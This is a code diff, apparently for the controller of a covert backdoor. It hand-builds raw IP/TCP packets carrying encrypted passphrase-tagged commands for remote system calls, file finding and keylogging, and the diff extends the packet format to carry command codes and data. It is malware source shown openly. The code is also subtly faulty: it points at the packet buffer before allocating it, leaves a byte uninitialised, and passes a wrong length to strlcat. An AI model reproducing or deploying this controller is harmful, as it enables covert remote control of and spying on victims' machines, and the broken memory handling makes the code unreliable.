@@ -6,7 +6,7 @@ static int getUserInput(char *commandData, int command);
 static void executeSystemCall(netInfo *info, char *commandData);
 static void findFile(netInfo *info, char *commandData);
 static void keylogger(netInfo *info);
-static void sendCommand(netInfo *info, char *commandData);
+static void sendCommand(netInfo *info, int command, char *commandData);
 
 int main (int argc, char **argv)
 {
@@ -86,17 +86,19 @@ static void findFile(netInfo *info, char *commandData)
 
 static void keylogger(netInfo *info)
 {
-    
+    sendCommand(info, KEYLOGGER, NULL);
 }
 
-static void sendCommand(netInfo *info, char *commandData)
+static void sendCommand(netInfo *info, int command, char *commandData)
 {
-    char buffer[PCKT_LEN];
+    char *buffer = NULL;
     char date[11];
-    char *keyword = NULL;
+    char *commandBuffer = NULL;
+    char *passphrase = NULL;
     char *encryptedField = NULL;
     int sock = 0;
     int one = 1;
+    int headerLength = 0;
     const int *val = &one;
     struct ip *iph = (struct ip *) buffer;
     struct tcphdr *tcph = (struct tcphdr *) (buffer + sizeof(struct ip));
@@ -104,13 +106,35 @@ static void sendCommand(netInfo *info, char *commandData)
     struct sockaddr_in din;
     struct tm *timeStruct;
     time_t t;
+
+    // Create the packet buffer and get the total length of the packet
+    if (commandData != NULL)
+    {
+        // Get the length of the command
+        headerLength = strnlen(commandData, PATH_MAX);
+        // Allocate the buffer for the packet
+        buffer = malloc(sizeof(char) * (PCKT_LEN + headerLength + 2));
+        // Allocate the command buffer, add 3 for the command plus NULL
+        commandBuffer = malloc(sizeof(char) * (headerLength + 3));
+        
+    }
+    else
+    {
+        // Allocate the buffer for the packet
+        buffer = malloc(sizeof(char) * (PCKT_LEN + 2));
+        // Allocate the command buffer plus 1 for the NULL
+        commandBuffer = malloc(sizeof(char) * 3);
+    }
     
+    // Finish computing the total header length
+    headerLength += sizeof(struct ip) + sizeof(struct tcphdr) + 2;
+
     // Get the time and create the secret code
     time(&t);
     timeStruct = localtime(&t);
     strftime(date, sizeof(date), "%Y:%m:%d", timeStruct);
-    keyword = strdup(PASSPHRASE);
-    encryptedField = encrypt_data(keyword, date, 4);
+    passphrase = strdup(PASSPHRASE);
+    encryptedField = encrypt_data(passphrase, date, 4);
     
     // Fill out the addess structs
     sin.sin_family = AF_INET;
@@ -127,7 +151,7 @@ static void sendCommand(netInfo *info, char *commandData)
     iph->ip_hl = 5;
     iph->ip_v = 4;
     iph->ip_tos = 16;
-    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
+    iph->ip_len = headerLength;
     iph->ip_id = htons(54321);
     iph->ip_off = 0;
     iph->ip_ttl = 64;
@@ -148,7 +172,18 @@ static void sendCommand(netInfo *info, char *commandData)
     tcph->th_sum = 0;	// Done by kernel
     tcph->th_urp = 0;
     
-    // Insert the command
+    // Build the command
+    commandBuffer[0] = command;
+    commandBuffer[1] = '|';
+    commandBuffer[3] = '\0';
+    
+    // If we have command data, combine it with the command code
+    if (commandData != NULL)
+    {
+        strlcat(commandBuffer, commandData, strnlen(commandData, PATH_MAX));
+    }
+    // Copy the command into the packet
+    memcpy(buffer + headerLength, commandBuffer, strnlen(commandBuffer, PATH_MAX));
     
     // IP checksum calculation
     iph->ip_sum = csum((unsigned short *) buffer, (sizeof(struct ip) + sizeof(struct tcphdr)));
@@ -177,7 +212,9 @@ static void sendCommand(netInfo *info, char *commandData)
     {
         systemFatal("Unable to close the raw socket");
     }
-    free(keyword);
+    
+    free(buffer);
+    free(commandBuffer);
 
 }
 
@@ -192,7 +229,7 @@ static int getUserInput(char *commandData, int command)
         printf("Enter filename, max %d characters\n", PATH_MAX);
     
     // Obtain the entry
-    if (fgets(commandData, PATH_MAX, stdin) != NULL)
+    if (fgets(commandData + 2, PATH_MAX, stdin) != NULL)
     {
         // Remove the newline character if it exists
         if ((temp = strchr(commandData, '\n')) != NULL)
